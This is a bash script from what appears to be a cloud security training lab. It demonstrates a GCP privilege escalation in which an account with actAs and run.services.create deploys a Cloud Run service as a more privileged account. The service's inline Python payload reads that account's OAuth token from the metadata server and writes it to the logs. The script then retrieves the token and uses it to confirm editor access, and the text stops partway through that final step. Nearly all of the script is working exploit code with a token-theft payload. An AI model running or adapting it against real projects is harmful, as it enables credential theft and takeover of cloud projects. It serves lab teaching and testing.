#!/bin/bash

# Demo script for gcp-cloudrun-001-iam-serviceaccountsactas+run-servicescreate
#
# Attack: starting_sa holds iam.serviceAccounts.actAs on target_sa plus
# run.services.create on the project (via minimal custom roles). It deploys a
# new Cloud Run service bound to target_sa using a PUBLIC Docker Hub image
# (docker.io/library/python:3.13-slim) — no Artifact Registry access is
# needed, which is the crux of the technique. An inline Python payload
# (same shape as gcpwn's _python_service_code) fetches target_sa's OAuth
# token and email from the local metadata server and prints them to stdout
# (exfil-mode logs, mirroring gcpwn's CREATE_CLOUDRUN_SERVICE_AS_SA
# exploit), then serves HTTP so the service stays healthy. The attacker
# invokes the service to trigger a fresh per-request exfil, reads the
# exfiltrated token from Cloud Run logs, and uses the raw stolen token
# directly against Google REST APIs (never re-impersonating via gcloud) to
# prove it now holds target_sa's roles/editor project permissions.
#
# Payload mechanics: `python -c` bootstraps from the EXFIL_PAYLOAD env var.
# gcloud's --args list splits values on commas (repeated --args flags and
# backslash-escaping do NOT carry a literal comma through), so the
# comma-heavy Python payload travels in the EXFIL_PAYLOAD environment
# variable: via --env-vars-file (YAML — no comma parsing) in gcloud mode,
# and as a plain env entry in the raw JSON body in --api-only mode. Every
# print carries flush=True — container stdout is block-buffered when piped
# to the logging agent, and an unflushed token print never reaches the logs.
#
# actAs is checked at service CREATION time: binding --service-account=target_sa
# is only accepted because starting_sa holds iam.serviceAccounts.actAs on it.
#
# Modes:
#   Default (gcloud): uses `gcloud run deploy` with --no-allow-unauthenticated
#     — clearer, pedagogically closer to what an attacker would run. The
#     --no-allow-unauthenticated flag makes gcloud skip the run.services.setIamPolicy
#     call entirely; we authenticate to the invoke endpoint with an ID token
#     minted as starting_sa instead (run.routes.invoke — run.services.invoke
#     is not a real GCP IAM permission). Verified permission classification
#     (2026-11-01 leave-one-out isolation run, both modes green):
#       run.services.get and logging.logEntries.list are REQUIRED even with
#       the raw API (URL extraction + LRO polling + the logs exfil channel) —
#       they live in the cr_deploy_req role, not the helpful role.
#       The only gcloud-mechanic helpful permission is run.services.update
#       (re-deploying to the service name left by a prior run takes the
#       update path; a fresh deploy never needs it).
#
#   --api-only: uses the raw Cloud Run v2 REST API via curl. Requires only the
#     verified raw-API minimum: run.services.create + actAs + run.services.get
#     (fetch the service URL via urls[]) + run.operations.get (poll the async
#     LRO) + logging.logEntries.list (read the exfiltrated token from the
#     logs). Demonstrates the exact minimal permission surface of the attack.
#
# Re-running / switching modes: both modes use the same deterministic
# SERVICE_NAME. gcloud mode re-deploys in place (its helpful run.services.update
# covers the update path), but the raw --api-only create has no update fallback
# and returns 409 ALREADY_EXISTS if the service already exists. --api-only mode
# therefore pre-checks for an existing service and tells you to run
# cleanup_attack.sh first rather than failing deep in the deploy.
#
# Credential model (no static SA keys):
#   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
#   Both modes impersonate starting_sa via --impersonate-service-account or
#   gcloud auth print-access-token respectively.

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
DIM='\033[2m'

ATTACK_COMMANDS=()
USE_GCLOUD=true

# Parse flags
for arg in "$@"; do
    case "$arg" in
        --api-only) USE_GCLOUD=false ;;
        *) echo -e "${RED}Unknown flag: $arg${NC}"; echo "Usage: $0 [--api-only]"; exit 1 ;;
    esac
done

show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Like show_attack_cmd but does not add to the summary — use for illustrative
# commands that show individual hops but are not the actual exploit commands.
show_illustrative_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
}

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}GCP-CLOUDRUN-001: Cloud Run Service actAs Privilege Escalation Demo${NC}"
if $USE_GCLOUD; then
    echo -e "${GREEN}Mode: gcloud (default)${NC}"
else
    echo -e "${GREEN}Mode: raw API (--api-only)${NC}"
fi
echo -e "${GREEN}========================================${NC}\n"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Step 1: Retrieve scenario configuration from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../../../gcp  # scenario dir -> gcp/ (terraform root)

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | \
    jq -r '.gcp_single_account_privesc_one_hop_to_admin_gcp_cloudrun_001_iam_serviceaccountsactas_run_servicescreate.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you have deployed this scenario: plabs apply"
    exit 1
fi

STARTING_SA_EMAIL=$(echo "$MODULE_OUTPUT" | jq -r '.starting_sa_email')
TARGET_SA_EMAIL=$(echo "$MODULE_OUTPUT"   | jq -r '.target_sa_email')
FLAG_SECRET_ID=$(echo "$MODULE_OUTPUT"    | jq -r '.flag_secret_id')
DEPLOYER_EMAIL=$(echo "$MODULE_OUTPUT"    | jq -r '.deployer_email')
REGION=$(echo "$MODULE_OUTPUT"            | jq -r '.region')
PROJECT_ID=$(terraform output -raw gcp_project_id 2>/dev/null)
[ -z "$PROJECT_ID" ] && PROJECT_ID=$(echo "$MODULE_OUTPUT" | jq -r '.project_id // empty')
RESOURCE_SUFFIX=$(terraform output -raw resource_suffix 2>/dev/null)

ENV_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.gcp_prod_environment.value // empty')
ADMIN_CLEANUP_SA=$(echo "$ENV_OUTPUT" | jq -r '.admin_cleanup_service_account_email // empty')

cd - > /dev/null

for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID REGION RESOURCE_SUFFIX; do
    val="${!var_name}"
    if [ -z "$val" ] || [ "$val" = "null" ]; then
        echo -e "${RED}Error: Could not extract $var_name from Terraform output${NC}"
        exit 1
    fi
done

echo "Starting SA (no project role): $STARTING_SA_EMAIL"
echo "Target SA   (roles/editor):    $TARGET_SA_EMAIL"
echo "Deployer    (your ADC):        $DEPLOYER_EMAIL"
echo "Region:                        $REGION"
echo "Project:                       $PROJECT_ID"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Hard-fail if our current gcloud CLI identity differs from the deployer that
# terraform provisioned. Terraform's ADC-derived deployer identity and the
# gcloud CLI session are two separate credential stores; a mismatch means
# every --impersonate-service-account call below will fail with a permission
# error, so stop now with actionable remediation instead of failing deep into
# the demo.
CURRENT_ADC_EMAIL=$(gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null | head -1)
if [ -n "$CURRENT_ADC_EMAIL" ] && [ "$CURRENT_ADC_EMAIL" != "$DEPLOYER_EMAIL" ]; then
    echo -e "${RED}Error: Your active gcloud account ($CURRENT_ADC_EMAIL) differs from the${NC}"
    echo -e "${RED}deployer account that provisioned the impersonation grant ($DEPLOYER_EMAIL).${NC}"
    echo -e "${RED}Run: gcloud auth login --update-adc${NC}"
    echo -e "${RED}This sets both your gcloud CLI session and ADC to the same identity.${NC}"
    echo -e "${RED}Then re-run 'terraform apply' if the deployer identity changed.${NC}\n"
    exit 1
fi

# Deterministic artifact name, derived from the stable resource_suffix, so
# re-running the demo after a failed cleanup simply updates the same service
# in place rather than accumulating orphaned resources.
SERVICE_NAME="pl-cr001-exfil-${RESOURCE_SUFFIX}"

# The exfil payload (Python, runs INSIDE the deployed Cloud Run service):
#   1. On startup, fetch target_sa's OAuth token and email from the LOCAL
#      metadata server (Metadata-Flavor: Google is mandatory) — from inside
#      the container this returns the identity of whatever SA the service
#      runs as, i.e. target_sa — and print both to stdout (flushed) so they
#      land in Cloud Logging: that is the exfil channel (exfil-mode logs).
#   2. Serve HTTP on $PORT (health check + invocation target); every GET
#      re-fetches and re-prints the token, so the invoke in step 4 triggers
#      a fresh exfil the attacker can correlate.
#   3. Never exits, so the service stays healthy.
EXFIL_PAYLOAD='import os
import urllib.request
import http.server
B="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/"
H={"Metadata-Flavor":"Google"}
def q(p):
    return urllib.request.urlopen(urllib.request.Request(B+p,headers=H)).read().decode()
print("EXFIL_EMAIL: "+q("email"),flush=True)
print("EXFIL_TOKEN: "+q("token"),flush=True)
class S(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print("EXFIL_EMAIL: "+q("email"),flush=True)
        print("EXFIL_TOKEN: "+q("token"),flush=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self,*a):
        pass
http.server.HTTPServer(("",int(os.environ.get("PORT","8080"))),S).serve_forever()'

# gcloud-mode env file carrying the payload (gcloud parses non-.env files as
# YAML, and JSON is a subset of YAML — so a jq-written JSON file survives
# gcloud's list-flag comma splitting and needs no PyYAML). Cleaned up in the
# exit trap alongside the deployed service.
PAYLOAD_ENV_FILE=$(mktemp)
jq -n --arg payload "$EXFIL_PAYLOAD" '{EXFIL_PAYLOAD: $payload}' > "$PAYLOAD_ENV_FILE"

# Trap: on abnormal exit (error, Ctrl-C, kill), best-effort delete the
# deployed Cloud Run service so a failed demo run does not leak a service
# running as target_sa. Deletion runs as the admin cleanup SA via the
# operator's ADC (same credential model as cleanup_attack.sh).
SERVICE_DEPLOYED=false
DEMO_COMPLETED=false

cleanup_on_exit() {
    local EXIT_CODE=$?
    trap - EXIT INT TERM
    if [ "$SERVICE_DEPLOYED" = true ] && [ "$DEMO_COMPLETED" != true ]; then
        echo ""
        echo -e "${YELLOW}Abnormal exit (code $EXIT_CODE) — best-effort deleting deployed service $SERVICE_NAME...${NC}"
        if [ -n "$ADMIN_CLEANUP_SA" ] && [ "$ADMIN_CLEANUP_SA" != "null" ]; then
            gcloud run services delete "$SERVICE_NAME" \
                --region="$REGION" \
                --project="$PROJECT_ID" \
                --impersonate-service-account="$ADMIN_CLEANUP_SA" \
                --quiet >/dev/null 2>&1 || true
        else
            # Fall back to deleting as the starting SA (needs run.services.delete,
            # which starting_sa does not hold — this may silently fail).
            gcloud run services delete "$SERVICE_NAME" \
                --region="$REGION" \
                --project="$PROJECT_ID" \
                --impersonate-service-account="$STARTING_SA_EMAIL" \
                --quiet >/dev/null 2>&1 || true
        fi
        echo -e "${YELLOW}If deletion failed, run ./cleanup_attack.sh manually${NC}"
    fi
    rm -f "$PAYLOAD_ENV_FILE"
    exit $EXIT_CODE
}
trap cleanup_on_exit EXIT INT TERM

# Timestamp scope for the step-5 log read (see Step 5): container log entries
# persist for weeks and this demo re-uses one deterministic service name, so
# entries from PREVIOUS runs carry expired metadata tokens (tokens live
# ~30 min). Only entries written after this moment are valid exfil material.
# Captured early — before the 15s propagation wait + step 2 checks + deploy —
# to absorb a minute of clock skew against Google's log timestamps.
DEMO_START_UTC=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

echo -e "${YELLOW}Waiting for IAM bindings to propagate (15s)...${NC}"
sleep 15
echo -e "${GREEN}✓ Propagation wait complete${NC}\n"

# Step 2: [OBSERVATION] Confirm we are acting as the starting SA, and that it
# has no project-level privilege of its own (it cannot read the CTF flag).
# The token mint proves the deployer's serviceAccountTokenCreator grant on
# starting_sa works — the same impersonation every [EXPLOIT] step below uses.
echo -e "${YELLOW}Step 2: Confirming starting SA identity and lack of project privilege${NC}"

echo -e "\n${DIM}Step 2a (illustrative — proving we act as the starting SA):${NC}"
show_illustrative_cmd "YOUR ADC (${DEPLOYER_EMAIL})" \
    "gcloud auth print-access-token --impersonate-service-account=$STARTING_SA_EMAIL"
# Retry the first impersonation: right after `plabs apply` the deployer's
# serviceAccountTokenCreator grant on starting_sa can take up to ~90s to
# propagate, longer than the fixed 15s wait above. Retrying here (rather than
# lengthening the wait for everyone) keeps a warm deployment fast while still
# tolerating a cold one. Once this first mint succeeds, every later
# impersonation in the demo works immediately.
STARTING_SA_TOKEN=""
for attempt in $(seq 1 8); do
    STARTING_SA_TOKEN=$(gcloud auth print-access-token \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
    [ -n "$STARTING_SA_TOKEN" ] && break
    if [ "$attempt" -eq 8 ]; then
        echo -e "${RED}✗ Could not mint token for starting SA after ~90s (check the deployer grant)${NC}"
        echo "The deployer ($DEPLOYER_EMAIL) needs roles/iam.serviceAccountTokenCreator on"
        echo "$STARTING_SA_EMAIL. If you just ran 'plabs apply', the grant may still be"
        echo "propagating — wait a moment and re-run."
        exit 1
    fi
    echo -e "${DIM}  Token mint denied (IAM grant still propagating) — retrying in 12s... ($((attempt * 12))s elapsed)${NC}"
    sleep 12
done
show_cmd "$STARTING_SA_EMAIL (via tokeninfo)" \
    "curl -s 'https://oauth2.googleapis.com/tokeninfo?access_token=<redacted>'"
TOKEN_INFO=$(curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${STARTING_SA_TOKEN}")
TOKEN_EMAIL=$(echo "$TOKEN_INFO" | jq -r '.email // empty')
if [ "$TOKEN_EMAIL" != "$STARTING_SA_EMAIL" ]; then
    echo -e "${RED}✗ Token does not belong to starting SA (got: ${TOKEN_EMAIL:-none})${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Acting as $STARTING_SA_EMAIL (identity confirmed via tokeninfo)${NC}"
unset STARTING_SA_TOKEN

echo -e "\n${DIM}Step 2b (baseline — starting SA has no project role):${NC}"
show_cmd "$STARTING_SA_EMAIL" \
    "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL (expected: PERMISSION_DENIED)"

if gcloud secrets versions access latest \
        --secret="$FLAG_SECRET_ID" \
        --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null; then
    echo -e "${YELLOW}Note: starting SA can already read the secret — check IAM bindings${NC}"
else
    echo -e "${GREEN}✓ Confirmed: starting SA cannot read the flag (no project role, as expected)${NC}"
fi
echo ""

# Step 3: [EXPLOIT] Deploy a new Cloud Run service bound to target_sa using a
# PUBLIC Docker Hub image. This is the crux of the technique:
#   - run.services.create lets starting_sa create the service.
#   - iam.serviceAccounts.actAs on target_sa is checked at creation time —
#     --service-account=target_sa would fail without it.
#   - The image is pulled straight from Docker Hub, so NO
#     artifactregistry.repositories.downloadArtifacts is needed (that is only
#     required when pulling from Artifact Registry).
# The container command override fetches target_sa's OAuth token from the
# metadata server and prints it to stdout → Cloud Run logs.
#
# --no-allow-unauthenticated: keeps the service private (avoids the
# run.services.setIamPolicy call gcloud makes when allowing unauthenticated
# access). We invoke it with an ID token in step 4 instead.
#
# --api-only mode uses the raw Cloud Run v2 REST API directly via curl —
# only the true minimum permissions.
echo -e "${YELLOW}Step 3: [EXPLOIT] Deploying Cloud Run service bound to target SA (public Docker Hub image)${NC}"

GCLOUD_SERVICE_URL=""
API_ONLY_SERVICE_URL=""
ACCESS_TOKEN=""

if $USE_GCLOUD; then
    # gcloud mode — the attacker's natural first choice.
    # Capture stdout (JSON) and stderr (warnings/progress) separately.
    # gcloud --format=json prints structured JSON to stdout and WARNING/progress
    # messages to stderr — mixing them with 2>&1 breaks jq parsing. The deploy
    # waits until the service is Ready, and the returned Service resource
    # includes status.url — no separate describe call needed.
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "gcloud run deploy $SERVICE_NAME --image=docker.io/library/python:3.13-slim --region=$REGION --service-account=$TARGET_SA_EMAIL --command=python --args=-c --args='import os;exec(os.environ[EXFIL_PAYLOAD])' --env-vars-file=<EXFIL_PAYLOAD.yaml> --no-allow-unauthenticated --impersonate-service-account=$STARTING_SA_EMAIL"

    DEPLOY_STDERR_FILE=$(mktemp)
    # Mark as deployed BEFORE the deploy: gcloud may leave a broken service
    # behind even when it exits non-zero (e.g. revision created but container
    # fails the startup probe), and the exit trap must catch that case too.
    SERVICE_DEPLOYED=true
    DEPLOY_OUTPUT=$(gcloud run deploy "$SERVICE_NAME" \
            --image="docker.io/library/python:3.13-slim" \
            --region="$REGION" \
            --project="$PROJECT_ID" \
            --service-account="$TARGET_SA_EMAIL" \
            --command="python" \
            --args="-c" \
            --args="import os;exec(os.environ['EXFIL_PAYLOAD'])" \
            --env-vars-file="$PAYLOAD_ENV_FILE" \
            --memory="512Mi" \
            --max-instances=1 \
            --no-allow-unauthenticated \
            --impersonate-service-account="$STARTING_SA_EMAIL" \
            --format=json 2>"$DEPLOY_STDERR_FILE")
    DEPLOY_EXIT=$?

    if [ $DEPLOY_EXIT -ne 0 ]; then
        echo -e "${RED}✗ gcloud run deploy failed${NC}"
        tail -10 "$DEPLOY_STDERR_FILE"
        echo ""
        echo "Check that starting_sa holds iam.serviceAccounts.actAs on target_sa and"
        echo "run.services.create (plus run.services.get, run.operations.get and"
        echo "logging.logEntries.list, all verified required even with the raw API) on"
        echo "the project."
        echo ""
        echo "Tip: run with --api-only to use the raw REST API, which needs fewer permissions"
        rm -f "$DEPLOY_STDERR_FILE"
        exit 1
    fi
    rm -f "$DEPLOY_STDERR_FILE"

    GCLOUD_SERVICE_URL=$(echo "$DEPLOY_OUTPUT" | jq -r '.status.url // .status.uri // empty' 2>/dev/null)
    if [ -z "$GCLOUD_SERVICE_URL" ]; then
        echo -e "${RED}✗ Could not extract service URL from gcloud deploy output${NC}"
        echo "Deploy stdout (first 20 lines): $(echo "$DEPLOY_OUTPUT" | head -20)"
        exit 1
    fi
    echo -e "${GREEN}✓ Deployed $SERVICE_NAME (Ready) running as $TARGET_SA_EMAIL${NC}"
    echo -e "${GREEN}✓ Service URL: $GCLOUD_SERVICE_URL${NC}\n"
    SERVICE_DEPLOYED=true

else
    # --api-only mode — minimal permissions, raw Cloud Run v2 REST API.
    ACCESS_TOKEN=$(gcloud auth print-access-token \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
    if [ -z "$ACCESS_TOKEN" ]; then
        echo -e "${RED}✗ Could not mint access token for $STARTING_SA_EMAIL${NC}"
        exit 1
    fi

    # Pre-check: the raw create (POST) has no update fallback, so a service left
    # behind by a prior run or by gcloud mode makes it fail with 409
    # ALREADY_EXISTS. starting_sa holds run.services.get, so probe first and give
    # an actionable message instead of a deep-in-the-deploy error.
    PRE_GET_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        "https://run.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/services/${SERVICE_NAME}")
    if [ "$PRE_GET_CODE" = "200" ]; then
        echo -e "${RED}✗ A Cloud Run service named '$SERVICE_NAME' already exists.${NC}"
        echo "The raw API create cannot update an existing service (unlike gcloud mode)."
        echo "This usually means a previous run — or the default gcloud mode — left it behind."
        echo -e "${YELLOW}Run ./cleanup_attack.sh first, then re-run with --api-only.${NC}"
        exit 1
    fi

    # (a) Create the service — requires run.services.create + iam.serviceAccounts.actAs.
    # No Artifact Registry interaction at all: the public Docker Hub image is
    # pulled directly by Cloud Run at instance start.
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "curl -X POST 'https://run.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/services?serviceId=$SERVICE_NAME' (run.services.create + iam.serviceAccounts.actAs)"

    CREATE_BODY=$(jq -n \
        --arg sa_email "$TARGET_SA_EMAIL" \
        --arg payload "$EXFIL_PAYLOAD" \
        --arg bootstrap "import os;exec(os.environ['EXFIL_PAYLOAD'])" \
        '{template: {serviceAccount: $sa_email,
                     containers: [{image: "docker.io/library/python:3.13-slim",
                                   command: ["python"],
                                   args: ["-c", $bootstrap],
                                   env: [{name: "EXFIL_PAYLOAD", value: $payload}],
                                   resources: {limits: {memory: "512Mi", cpu: "1000m"}}}]}}')

    CREATE_RESPONSE=$(curl -s -X POST \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -H "Content-Type: application/json" \
        -d "$CREATE_BODY" \
        "https://run.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/services?serviceId=${SERVICE_NAME}")

    OPERATION_NAME=$(echo "$CREATE_RESPONSE" | jq -r '.name // empty')
    CREATE_ERROR=$(echo "$CREATE_RESPONSE" | jq -r '.error.message // empty')
    if [ -z "$OPERATION_NAME" ] || [ -n "$CREATE_ERROR" ]; then
        echo -e "${RED}✗ Service create failed${NC}"
        echo "Response: $CREATE_RESPONSE"
        if echo "$CREATE_ERROR" | grep -qi 'already exists'; then
            echo -e "${YELLOW}The service already exists. Run ./cleanup_attack.sh first, then re-run.${NC}"
        fi
        exit 1
    fi

    # The POST above created the service (LRO accepted) — from this point the
    # service exists even if polling or later steps fail, so arm the exit trap
    # to delete it on any abnormal path.
    SERVICE_DEPLOYED=true

    # (b) Poll the async LRO until the service is Ready (run.operations.get —
    # the raw-API equivalent of what gcloud does internally; mirrors
    # gcp-cloudfunctions-001's cloudfunctions.operations.get).
    # Note: no permission check happens until an instance starts — deployment
    # succeeds regardless of the container's runtime behavior. The service
    # serving traffic (and printing the token) is triggered by step 4.
    echo "Waiting for service deployment to complete (polling via operations API)..."
    for i in $(seq 1 30); do
        sleep 5
        OP_STATUS=$(curl -s \
            -H "Authorization: Bearer $ACCESS_TOKEN" \
            "https://run.googleapis.com/v2/${OPERATION_NAME}")
        OP_DONE=$(echo "$OP_STATUS" | jq -r '.done // "false"')
        OP_ERROR=$(echo "$OP_STATUS" | jq -r '.error.message // empty')
        if [ -n "$OP_ERROR" ]; then
            echo -e "${RED}✗ Service deploy operation failed: $OP_ERROR${NC}"
            echo "Operation response: $OP_STATUS"
            exit 1
        fi
        if [ "$OP_DONE" = "true" ]; then
            break
        fi
        if [ "$i" -eq 30 ]; then
            echo -e "${RED}✗ Service did not become Ready after 150s${NC}"
            exit 1
        fi
    done
    SERVICE_DEPLOYED=true

    # (c) Fetch the service URL (run.services.get — candidate required even
    # with the raw API; the isolator will confirm).
    show_cmd "$STARTING_SA_EMAIL" \
        "curl -s -H 'Authorization: Bearer <redacted>' 'https://run.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/services/$SERVICE_NAME' (run.services.get)"
    SERVICE_JSON=$(curl -s \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        "https://run.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/services/${SERVICE_NAME}")
    API_ONLY_SERVICE_URL=$(echo "$SERVICE_JSON" | jq -r '.urls[0] // .status.uri // .status.url // empty')
    if [ -z "$API_ONLY_SERVICE_URL" ]; then
        echo -e "${RED}✗ Could not extract service URL from services.get response${NC}"
        echo "Response: $SERVICE_JSON"
        exit 1
    fi

    echo -e "${GREEN}✓ Deployed $SERVICE_NAME (Ready) running as $TARGET_SA_EMAIL${NC}"
    echo -e "${GREEN}✓ Service URL: $API_ONLY_SERVICE_URL${NC}\n"
fi

# Step 4: [EXPLOIT] Invoke the service as starting_sa. Cloud Run scales to
# zero, so the container only starts when the first request arrives — this
# invocation is what triggers execution of the exfil command. The service is
# private (--no-allow-unauthenticated), so we mint an OIDC identity token
# scoped to the service URL as audience as starting_sa and send it as the
# Bearer token directly via curl. After printing the token, the container
# serves HTTP via busybox httpd, so the request itself should succeed too.
echo -e "${YELLOW}Step 4: [EXPLOIT] Invoking the service to trigger token exfiltration${NC}"

if $USE_GCLOUD; then
    SERVICE_URL="$GCLOUD_SERVICE_URL"
else
    SERVICE_URL="$API_ONLY_SERVICE_URL"
fi

show_attack_cmd "$STARTING_SA_EMAIL" \
    "ID_TOKEN=\$(gcloud auth print-identity-token --impersonate-service-account=$STARTING_SA_EMAIL --audiences=$SERVICE_URL); curl -s -H 'Authorization: Bearer \$ID_TOKEN' \$SERVICE_URL"

ID_TOKEN=$(gcloud auth print-identity-token \
    --impersonate-service-account="$STARTING_SA_EMAIL" \
    --audiences="$SERVICE_URL" 2>/dev/null)

if [ -z "$ID_TOKEN" ]; then
    echo -e "${RED}✗ Failed to mint identity token for $STARTING_SA_EMAIL${NC}"
    exit 1
fi

INVOKE_RESPONSE=$(curl -sS -m 120 -H "Authorization: Bearer $ID_TOKEN" "$SERVICE_URL" 2>/dev/null) \
    && INVOKE_OK=true || INVOKE_OK=false

if $INVOKE_OK; then
    echo -e "${GREEN}✓ Invoked $SERVICE_NAME (container ran as $TARGET_SA_EMAIL)${NC}"
else
    echo -e "${YELLOW}Note: request returned an error (container may not be serving) — the token${NC}"
    echo -e "${YELLOW}is still exfiltrated to the logs during instance startup${NC}"
fi
echo ""

# Step 5: [EXPLOIT] Read the exfiltrated token from the Cloud Run logs
# (exfil-mode logs). Poll for up to ~3 minutes: the cold start triggered by
# step 4 may take a few seconds, and Cloud Logging lags slightly behind
# container stdout. Requires logging.logEntries.list (granted in the required
# role) — same channel gcpwn uses for --exfil-mode logs.
echo -e "${YELLOW}Step 5: [EXPLOIT] Exfiltrating target SA token from Cloud Run logs${NC}"

EXFILTRATED_TOKEN=""
LOGS_FILTER="resource.type=cloud_run_revision AND resource.labels.service_name=${SERVICE_NAME} AND resource.labels.location=${REGION} AND timestamp>=\"${DEMO_START_UTC}\""

for i in $(seq 1 18); do
    if $USE_GCLOUD; then
        LOGS_TEXT=$(gcloud logging read "$LOGS_FILTER" \
            --project="$PROJECT_ID" \
            --impersonate-service-account="$STARTING_SA_EMAIL" \
            --limit=20 \
            --format="value(textPayload)" 2>/dev/null) || LOGS_TEXT=""
    else
        LOGS_RESPONSE=$(curl -s -X POST \
            -H "Authorization: Bearer $ACCESS_TOKEN" \
            -H "Content-Type: application/json" \
            -d "$(jq -n --arg proj "projects/$PROJECT_ID" --arg filter "$LOGS_FILTER" \
                '{resourceNames: [$proj], filter: $filter, orderBy: "timestamp desc", pageSize: 20}')" \
            "https://logging.googleapis.com/v2/entries:list")
        LOGS_TEXT=$(echo "$LOGS_RESPONSE" | jq -r '.entries[]?.textPayload // empty')
    fi

    # Entries arrive newest-first (gcloud logging read default order; the raw
    # entries:list body sets orderBy "timestamp desc"). Iterate the
    # EXFIL_TOKEN candidates and accept only the first one the tokeninfo
    # endpoint actually validates — even with the timestamp-scoped filter,
    # an entry from a prior run minutes ago can carry an about-to-expire
    # token, and a token tokeninfo rejects is worthless exfil material.
    while IFS= read -r TOKEN_LINE; do
        CAND_TOKEN=$(echo "${TOKEN_LINE#EXFIL_TOKEN: }" | jq -r '.access_token // empty')
        [ -z "$CAND_TOKEN" ] && continue
        CAND_EMAIL=$(curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${CAND_TOKEN}" \
            | jq -r '.email // empty')
        if [ -n "$CAND_EMAIL" ]; then
            EXFILTRATED_TOKEN="$CAND_TOKEN"
            break
        fi
    done < <(echo "$LOGS_TEXT" | grep '^EXFIL_TOKEN: ')
    [ -n "$EXFILTRATED_TOKEN" ] && break

    if [ "$i" -eq 18 ]; then
        echo -e "${RED}✗ Exfiltrated token never appeared in the Cloud Run logs${NC}"
        echo "Recent log entries: $(echo "$LOGS_TEXT" | head -10)"
        exit 1
    fi
    echo "  Waiting for the exfiltrated token to appear in logs... ($((i * 10))s elapsed)"
    sleep 10
done

echo -e "${GREEN}✓ Exfiltrated an OAuth access token belonging to target_sa's runtime identity${NC}"
echo -e "${GREEN}  (from Cloud Run logs — gcpwn 'exfil-mode logs' equivalent)${NC}\n"

# Step 6: [OBSERVATION] Verify the exfiltrated token actually belongs to
# target_sa, using the raw bearer token directly against Google's tokeninfo
# endpoint — not gcloud impersonation. This is the proof that the
# metadata-server theft worked, independent of any gcloud identity on this
# machine.
echo -e "${YELLOW}Step 6: Verifying stolen token identity via raw bearer token${NC}"
show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
    "curl -s 'https://oauth2.googleapis.com/tokeninfo?access_token=<redacted>'"

TOKEN_EMAIL=""
for RETRY in 1 2 3 4; do
    TOKEN_INFO=$(curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${EXFILTRATED_TOKEN}")
    TOKEN_EMAIL=$(echo "$TOKEN_INFO" | jq -r '.email // empty')
    [ -n "$TOKEN_EMAIL" ] && break
    # An empty email from a transient tokeninfo failure is not evidence of a
    # bad token — step 5 already validated this token, so retry before failing
    sleep 3
done

if [ "$TOKEN_EMAIL" != "$TARGET_SA_EMAIL" ]; then
    echo -e "${RED}✗ Exfiltrated token does not belong to target SA (got: ${TOKEN_EMAIL:-none})${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Confirmed: exfiltrated token belongs to $TARGET_SA_EMAIL${NC}\n"

# Step 7: [EXPLOIT] Confirm editor-level write access using the raw stolen
# token (project label write/restore round-trip) — not gcloud impersonation.
# Uses the Resource Manager v1 projects.update method: a synchronous HTTP PUT
# of the full Project resource (resourcemanager.projects.update, which
# roles/editor includes). Note: v1 update is PUT-with-full-resource, NOT a
# PATCH+updateMask — that shape belongs to the async v3 API and silently no-ops
# against v1. Success is keyed on the HTTP status (200 = authorized, 403 =
# denied/viewer-only), not the response body shape.
echo -e "${YELLOW}Step 7: [EXPLOIT] Verifying roles/editor write access via raw stolen token${NC}"
show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
    "curl -X PUT 'https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID' -H 'Authorization: Bearer <redacted>' -d '<project JSON with added label>'"

CURRENT_PROJECT_JSON=$(curl -s -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}")
# Build the full updated resource (v1 update replaces the whole Project).
UPDATED_PROJECT_JSON=$(echo "$CURRENT_PROJECT_JSON" \
    | jq -c '.labels = ((.labels // {}) + {"pl-privesc-verified": "true"})')

PUT_RESPONSE=$(curl -s -w $'\n%{http_code}' -X PUT \
    -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
